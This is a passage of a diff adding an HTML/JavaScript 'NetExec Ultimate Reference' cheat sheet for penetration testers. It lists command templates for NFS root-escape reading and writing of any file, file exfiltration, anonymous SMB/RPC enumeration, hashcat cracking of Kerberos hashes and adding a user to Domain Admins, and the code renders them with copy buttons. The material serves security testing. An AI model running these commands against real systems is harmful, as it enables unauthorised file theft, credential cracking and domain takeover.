+{id:249,n:"NFS Enum Depth",cat:"NFS",sub:"Enumeration",proto:"NFS",ph:"enum",noise:"medium",acc:"Network",cred:"None",purp:"Custom enum depth",cmd:"nxc nfs <TARGET> --enum-shares <DEPTH>",tips:"Default depth is 3."},
+{id:250,n:"NFS Download File",cat:"NFS",sub:"File Transfer",proto:"NFS",ph:"enum",noise:"medium",acc:"Network",cred:"None",purp:"Download via NFS",cmd:"nxc nfs <TARGET> --share <SHARE_PATH> --get-file <REMOTE_FILE> <LOCAL_FILE>",tips:"Exfiltrate files."},
+{id:251,n:"NFS Upload File",cat:"NFS",sub:"File Transfer",proto:"NFS",ph:"exploit",noise:"high",acc:"Network",cred:"None",purp:"Upload via NFS",cmd:"nxc nfs <TARGET> --share <SHARE_PATH> --put-file <LOCAL_FILE> <REMOTE_FILE>",tips:"Creates with chmod 777."},
+{id:252,n:"NFS Root Escape Get",cat:"NFS",sub:"Root Escape",proto:"NFS",ph:"exploit",noise:"high",acc:"Network",cred:"None",purp:"Download via root escape",cmd:"nxc nfs <TARGET> --get-file <REMOTE_PATH> <LOCAL_FILE>",tips:"Access any file on system!"},
+{id:253,n:"NFS Root Escape Put",cat:"NFS",sub:"Root Escape",proto:"NFS",ph:"exploit",noise:"high",acc:"Network",cred:"None",purp:"Upload via root escape",cmd:"nxc nfs <TARGET> --put-file <LOCAL_FILE> <REMOTE_PATH>",tips:"Write anywhere on system!"},
+{id:254,n:"NFS Root List",cat:"NFS",sub:"Root Escape",proto:"NFS",ph:"exploit",noise:"high",acc:"Network",cred:"None",purp:"List root filesystem",cmd:"nxc nfs <TARGET> --ls '/'",tips:"Full filesystem access."},
+
+// ========== EXTERNAL TOOLS (7) ==========
+{id:255,n:"smbclient Anonymous",cat:"General",sub:"Help & Info",proto:"External",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Anonymous SMB enum",cmd:'smbclient -N -U "" -L \\\\\\\\<TARGET>',tips:"Alternative to nxc null session."},
+{id:256,n:"rpcclient Anonymous",cat:"General",sub:"Help & Info",proto:"External",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Anonymous RPC enum",cmd:'rpcclient -N -U "" -L \\\\\\\\<TARGET>',tips:"RPC enumeration."},
+{id:257,n:"rpcclient enumdomusers",cat:"General",sub:"Help & Info",proto:"External",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"RPC user enum",cmd:"rpcclient \\$> enumdomusers",tips:"Inside rpcclient session."},
+{id:258,n:"Nmap SMB Signing",cat:"General",sub:"Help & Info",proto:"External",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Check SMB signing",cmd:"nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 <TARGET>",tips:"Alternative to --gen-relay-list."},
+{id:259,n:"Hashcat ASREPRoast",cat:"General",sub:"Help & Info",proto:"External",ph:"cred",noise:"low",acc:"Local",cred:"None",purp:"Crack ASREP hashes",cmd:"hashcat -m18200 <HASHES_FILE> <WORDLIST>",tips:"Mode 18200 for AS-REP."},
+{id:260,n:"Hashcat Kerberoast",cat:"General",sub:"Help & Info",proto:"External",ph:"cred",noise:"low",acc:"Local",cred:"None",purp:"Crack TGS hashes",cmd:"hashcat -m13100 <HASHES_FILE> <WORDLIST>",tips:"Mode 13100 for TGS-REP."},
+{id:261,n:"PowerShell Add DA",cat:"General",sub:"Help & Info",proto:"External",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Add to Domain Admins",cmd:"powershell.exe \"Invoke-Command -ComputerName <DC> -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members <USER>}\"",tips:"Ultimate privilege escalation."}
+];
+// === END OF ALL 261 COMMANDS ===
+
+console.log('Total commands loaded: ' + commands.length);
+
+// ============================================
+// GLOBAL VARIABLES AND HELPERS
+// ============================================
+const globalVars = {
+    '<TARGET>': 'g-target',
+    '<USER>': 'g-user',
+    '<PASS>': 'g-pass',
+    '<DOMAIN>': 'g-domain',
+    '<NT_HASH>': 'g-hash',
+    '<ATTACKER_IP>': 'g-attacker',
+    '<OUTPUT_FILE>': 'g-output'
+};
+
+const phaseLabels = {setup:'Setup',recon:'Recon',enum:'Enum',cred:'Cred',exploit:'Exploit',post:'Post'};
+let currentCategory = null;
+let currentSub = null;
+let expandedCards = new Set();
+
+// ============================================
+// INITIALIZATION
+// ============================================
+document.addEventListener('DOMContentLoaded', () => {
+    renderNavigation();
+    showAllCommands();
+    document.getElementById('total-cmds').textContent = commands.length;
+    
+    // Search with debounce
+    let _nxcSearchTimer;
+    const _nxcSearchEl = document.getElementById('search');
+    _nxcSearchEl.addEventListener('input', () => { clearTimeout(_nxcSearchTimer); _nxcSearchTimer = setTimeout(filterCommands, 120); });
+    _nxcSearchEl.addEventListener('keydown', (e) => { if (e.key === 'Escape') { _nxcSearchEl.value = ''; filterCommands(); } });
+
+    // / to focus search
+    document.addEventListener('keydown', (e) => {
+        if (e.key === '/' && document.activeElement !== _nxcSearchEl && !e.ctrlKey && !e.altKey && !e.metaKey) {
+            e.preventDefault(); _nxcSearchEl.focus(); _nxcSearchEl.select();
+        }
+    });
+    
+    // Apply on input change
+    document.querySelectorAll('.gen-group input').forEach(input => {
+        input.addEventListener('change', refreshAll);
+    });
+});
+
+// ============================================
+// NAVIGATION
+// ============================================
+function renderNavigation() {
+    const nav = document.getElementById('nav-container');
+    let html = '';
+    
+    Object.keys(categories).forEach(cat => {
+        const catData = categories[cat];
+        const catCmds = commands.filter(c => c.cat === cat);
+        
+        // Get unique subs for this category
+        const subs = [...new Set(catCmds.map(c => c.sub))];
+        
+        html += `
+            <div class="nav-cat" id="nav-${cat.replace(/\s/g,'')}">
+                <div class="nav-cat-header" onclick="toggleNavCat('${cat.replace(/\s/g,'')}')">
+                    <div style="display:flex;align-items:center">
+                        <span class="icon ${catData.color}">${catData.icon}</span>
+                        <span>${cat}</span>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:8px">
+                        <span class="count">${catCmds.length}</span>
+                        <span class="arrow">▼</span>
+                    </div>
+                </div>
+                <div class="nav-cat-items">
+                    <div class="nav-item" onclick="showCategory('${cat}')">
+                        <span>📋 All ${cat}</span>
+                        <span class="cnt">${catCmds.length}</span>
+                    </div>
+                    ${subs.map(sub => {
+                        const subCnt = catCmds.filter(c => c.sub === sub).length;
+                        return `<div class="nav-item" onclick="showSubCategory('${cat}','${sub}')">
+                            <span>${sub}</span>
+                            <span class="cnt">${subCnt}</span>
+                        </div>`;
+                    }).join('')}
+                </div>
+            </div>
+        `;
+    });
+    
+    nav.innerHTML = html;
+}
+
+function toggleNavCat(catId) {
+    document.getElementById('nav-' + catId).classList.toggle('open');
+}
+
+// ============================================
+// CONTENT RENDERING
+// ============================================
+function showAllCommands() {
+    currentCategory = null;
+    currentSub = null;
+    updateNavActive();
+    
+    const content = document.getElementById('content');
+    let html = `
+        <div class="section-header">
+            <h2>🎯 All Commands</h2>
+            <p>Complete NetExec command reference with ${commands.length} commands across ${Object.keys(categories).length} categories</p>
+        </div>
+        <div class="guide-box">
+            <h4>💡 Quick Start</h4>
+            <p>Fill in the <strong>global inputs</strong> at the top with your target info. Click <strong>Apply All</strong> to substitute values in all commands. Click any command to expand and copy.</p>
+            <div class="tip">💡 Start with vulnerability scans: ZeroLogon, PrintNightmare, SMBGhost, noPAC, and coercion checks!</div>
+        </div>
+    `;
+    
+    // Group by category
+    Object.keys(categories).forEach(cat => {
+        const catCmds = commands.filter(c => c.cat === cat);
+        if(catCmds.length === 0) return;
+        
+        html += renderCategorySection(cat, catCmds, true);
+    });
+    
+    content.innerHTML = html;
+    updateShowingCount();
+}
+
+function showCategory(cat) {
+    currentCategory = cat;
+    currentSub = null;
+    updateNavActive();
+    
+    const catData = categories[cat];
+    const catCmds = commands.filter(c => c.cat === cat);
+    
+    const content = document.getElementById('content');
+    let html = `
+        <div class="section-header">
+            <h2>${catData.icon} ${cat} <span class="proto-badge" style="background:var(--purple)">${catCmds.length} Commands</span></h2>
+            <p>${catData.guide.desc}</p>
+        </div>
+        <div class="guide-box">
+            <h4>📖 ${catData.guide.title}</h4>
+            <p>${catData.guide.desc}</p>
+            ${catData.guide.tips ? `<ul>${catData.guide.tips.map(t => `<li>${t}</li>`).join('')}</ul>` : ''}
+            ${catData.guide.warn ? `<div class="warn">⚠️ ${catData.guide.warn}</div>` : ''}
+        </div>
+    `;
+    
+    // Group by sub
+    const subs = [...new Set(catCmds.map(c => c.sub))];
+    subs.forEach(sub => {
+        const subCmds = catCmds.filter(c => c.sub === sub);
+        html += `
+            <div class="subcategory">
+                <div class="subcategory-header">${sub} (${subCmds.length})</div>
+                ${subCmds.map(c => renderCommandCard(c)).join('')}
+            </div>
+        `;
+    });
+    
+    content.innerHTML = html;
+    updateShowingCount(catCmds.length);
+}
+
+function showSubCategory(cat, sub) {
+    currentCategory = cat;
+    currentSub = sub;
+    updateNavActive();
+    
+    const catData = categories[cat];
+    const subCmds = commands.filter(c => c.cat === cat && c.sub === sub);
+    
+    const content = document.getElementById('content');
+    let html = `
+        <div class="section-header">
+            <h2>${catData.icon} ${cat} → ${sub} <span class="proto-badge" style="background:var(--cyan)">${subCmds.length} Commands</span></h2>
+            <p>${catData.guide.desc}</p>
+        </div>
+        ${subCmds.map(c => renderCommandCard(c)).join('')}
+    `;
+    
+    content.innerHTML = html;
+    updateShowingCount(subCmds.length);
+}
+
+function renderCategorySection(cat, catCmds, collapsed = false) {
+    const catData = categories[cat];
+    return `
+        <div class="category-section ${collapsed ? '' : 'collapsed'}" id="cat-${cat.replace(/\s/g,'')}">
+            <div class="category-header" onclick="toggleCategory('${cat.replace(/\s/g,'')}')">
+                <div class="category-icon ${catData.color}">${catData.icon}</div>
+                <div class="category-info">
+                    <h3>${cat}</h3>
+                    <p>${catData.guide.desc.substring(0, 80)}...</p>
+                </div>
+                <span class="category-count">${catCmds.length}</span>
+                <span class="category-arrow">▼</span>
+            </div>
+            <div class="category-content">
+                ${catCmds.slice(0, 10).map(c => renderCommandCard(c)).join('')}
+                ${catCmds.length > 10 ? `<div style="text-align:center;padding:10px"><button class="gen-btn" onclick="showCategory('${cat}')">View all ${catCmds.length} commands →</button></div>` : ''}
+            </div>
+        </div>
+    `;
+}
+
+function toggleCategory(catId) {
+    document.getElementById('cat-' + catId).classList.toggle('collapsed');
+}
+
+// ============================================
+// COMMAND CARD
+// ============================================
+function renderCommandCard(c) {
+    const isExpanded = expandedCards.has(c.id);
+    return `
+        <div class="cmd-card ${isExpanded ? 'expanded' : ''}" id="cmd-${c.id}">
+            <div class="cmd-header" onclick="toggleCmd(${c.id})">
+                <span class="cmd-num">#${c.id}</span>
+                <div class="cmd-main">
+                    <div class="cmd-title">${hlText(c.n)}</div>
+                    <div class="cmd-purpose">${hlText(c.purp)}</div>
+                </div>
+                <div class="cmd-badges">
+                    <span class="badge proto">${c.proto}</span>
+                    <span class="badge phase ${c.ph}">${phaseLabels[c.ph]}</span>
+                    <span class="badge noise ${c.noise}">${c.noise}</span>
+                </div>
+                <span class="cmd-expand">${isExpanded ? '▲' : '▼'}</span>
+            </div>
+            <div class="cmd-details">
+                <div class="cmd-details-inner">
+                    <div class="cmd-meta">
+                        <div class="cmd-meta-item"><span class="cmd-meta-label">Protocol</span><span class="cmd-meta-value">${c.proto}</span></div>
+                        <div class="cmd-meta-item"><span class="cmd-meta-label">Phase</span><span class="cmd-meta-value">${phaseLabels[c.ph]}</span></div>
+                        <div class="cmd-meta-item"><span class="cmd-meta-label">Noise</span><span class="cmd-meta-value">${c.noise}</span></div>
+                        <div class="cmd-meta-item"><span class="cmd-meta-label">Access</span><span class="cmd-meta-value">${c.acc}</span></div>
+                        <div class="cmd-meta-item"><span class="cmd-meta-label">Creds</span><span class="cmd-meta-value">${c.cred}</span></div>
+                    </div>
+                    <div class="cmd-box">
+                        <code id="cmd-code-${c.id}">${processCommand(c.cmd)}</code>
+                        <button class="copy-btn" onclick="copyCmd(${c.id}, event)">Copy</button>
+                    </div>
+                    ${c.tips ? `<div class="cmd-tips"><div class="cmd-tips-title">💡 Tips</div><div class="cmd-tips-content">${hlText(c.tips)}</div></div>` : ''}
+                </div>
+            </div>
+        </div>
+    `;
+}
+
+function toggleCmd(id) {
+    if(expandedCards.has(id)) {
+        expandedCards.delete(id);
+    } else {
+        expandedCards.add(id);
+    }
+    document.getElementById('cmd-' + id).classList.toggle('expanded');
+}
+
+// ============================================
+// COMMAND PROCESSING
+// ============================================
+function processCommand(cmd) {
+    let result = escapeHtml(cmd);
+    
+    Object.keys(globalVars).forEach(ph => {
+        const val = getGlobalValue(ph);
+        const escapedPh = ph.replace(/[<>]/g, m => m === '<' ? '&lt;' : '&gt;');
+        const regex = new RegExp(escapedPh, 'g');
+        
+        if(val) {
+            result = result.replace(regex, `<span class="filled">${escapeHtml(val)}</span>`);
+        } else {
+            result = result.replace(regex, `<span class="ph">${escapedPh}</span>`);
+        }
+    });
+    
+    // Highlight remaining placeholders
+    result = result.replace(/&lt;([A-Z0-9_]+)&gt;/g, '<span class="ph">&lt;$1&gt;</span>');
+    
+    return result;
+}
+
+function getRawCommand(cmd) {
+    let result = cmd;
+    Object.keys(globalVars).forEach(ph => {
+        const val = getGlobalValue(ph);
+        if(val) {
+            result = result.replace(new RegExp(ph.replace(/[<>]/g, '\\$&'), 'g'), val);
+        }
+    });
+    return result;
+}
+
+function getGlobalValue(ph) {
+    const inputId = globalVars[ph];
+    if(inputId) {
+        const el = document.getElementById(inputId);
+        return el ? el.value : '';
+    }
+    return '';
+}
+
+function escapeHtml(t) {
+    const d = document.createElement('div');
+    d.textContent = t;
+    return d.innerHTML;
+}
+
+let currentSearchTerms = [];
+function hlText(text) {
+    if (!text) return '';
+    if (!currentSearchTerms.length) return escapeHtml(text);
+    let h = escapeHtml(text);
+    currentSearchTerms.forEach(term => {
+        h = h.replace(new RegExp('(' + term.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'), '<mark>$1</mark>');
+    });
+    return h;
+}
+
+// ============================================
+// REFRESH AND FILTER
+// ============================================
+function refreshAll() {
+    // Re-render all visible command codes
+    commands.forEach(c => {
+        const codeEl = document.getElementById('cmd-code-' + c.id);
+        if(codeEl) {
+            codeEl.innerHTML = processCommand(c.cmd);
+        }
+    });
+    showToast('Commands updated!');
+}
+
+function clearGlobals() {
+    Object.values(globalVars).forEach(id => {
+        document.getElementById(id).value = '';
+    });
+    refreshAll();
+    showToast('Cleared all values');
+}
+
+function filterCommands() {
+    const query = document.getElementById('search').value.toLowerCase().trim();
+
+    if(!query) {
+        currentSearchTerms = [];
+        showAllCommands();
+        return;
+    }
+
+    const terms = query.split(/\s+/).filter(t => t.length > 0);
+    currentSearchTerms = terms;
+    const filtered = commands.filter(c => {
+        const text = [c.n, c.purp, c.cmd, c.cat, c.sub, c.proto, c.tips || ''].join(' ').toLowerCase();
+        return terms.every(t => text.includes(t));
+    });
+    
+    const content = document.getElementById('content');
+    
+    if(filtered.length === 0) {
+        content.innerHTML = `<div class="empty"><div class="icon">🔍</div><h3>No commands found</h3><p>Try different search terms</p></div>`;
+        updateShowingCount(0);
+        return;
+    }
+    
+    let html = `
+        <div class="section-header">
+            <h2>🔍 Search Results</h2>
+            <p>Found ${filtered.length} commands matching "${query}"</p>
+        </div>
+        ${filtered.map(c => renderCommandCard(c)).join('')}
+    `;
+    
+    content.innerHTML = html;
+    updateShowingCount(filtered.length);
+}
+
+function updateNavActive() {
+    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+}
+
+function updateShowingCount(count) {
+    document.getElementById('showing-cmds').textContent = count !== undefined ? count : commands.length;
+}
+
+// ============================================
+// COPY
+// ============================================
+function copyCmd(id, event) {
+    event.stopPropagation();
+    
+    const cmd = commands.find(c => c.id === id);
+    if(!cmd) return;
+    
+    const rawCmd = getRawCommand(cmd.cmd);
+    
+    navigator.clipboard.writeText(rawCmd).then(() => {
+        const btn = event.target;
+        btn.classList.add('copied');
+        btn.textContent = '✓ Copied!';
+        showToast('Command copied!');
+        
+        setTimeout(() => {
+            btn.classList.remove('copied');
+            btn.textContent = 'Copy';
+        }, 2000);
+    }).catch(() => {
+        // Fallback
+        const ta = document.createElement('textarea');
+        ta.value = rawCmd;
+        ta.style.position = 'fixed';
+        ta.style.left = '-9999px';
+        document.body.appendChild(ta);
+        ta.select();
+        try {
+            document.execCommand('copy');
+            showToast('Command copied!');
+        } catch(e) {
+            showToast('Copy failed');
+        }
+        document.body.removeChild(ta);
+    });
+}
+
+function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2000);
+}
+
+console.log('NetExec Ultimate Reference loaded with ' + commands.length + ' commands');
+</script>
+<button id="theme-toggle-btn" title="Toggle theme (t)">☀</button>
+
+<script>
+(function(){
+  function setTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    var btn = document.getElementById('theme-toggle-btn');
+    if (btn) btn.textContent = theme === 'dark' ? '☀' : '🌙';
+    try { localStorage.setItem('mahdiesta-theme', theme); } catch(e) {}
+  }
+  function toggleTheme() {
+    var current = document.documentElement.getAttribute('data-theme') || 'dark';
+    setTheme(current === 'dark' ? 'light' : 'dark');
+  }
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 't' || e.key === 'T') toggleTheme();
+  });
+  var btn = document.getElementById('theme-toggle-btn');
+  if (btn) btn.addEventListener('click', toggleTheme);
+  var saved = 'dark';
+  try { saved = localStorage.getItem('mahdiesta-theme') || 'dark'; } catch(e) {}
+  setTheme(saved);
+})();
+</script>
+
+<footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+</footer>
+
+</body>
+</html>
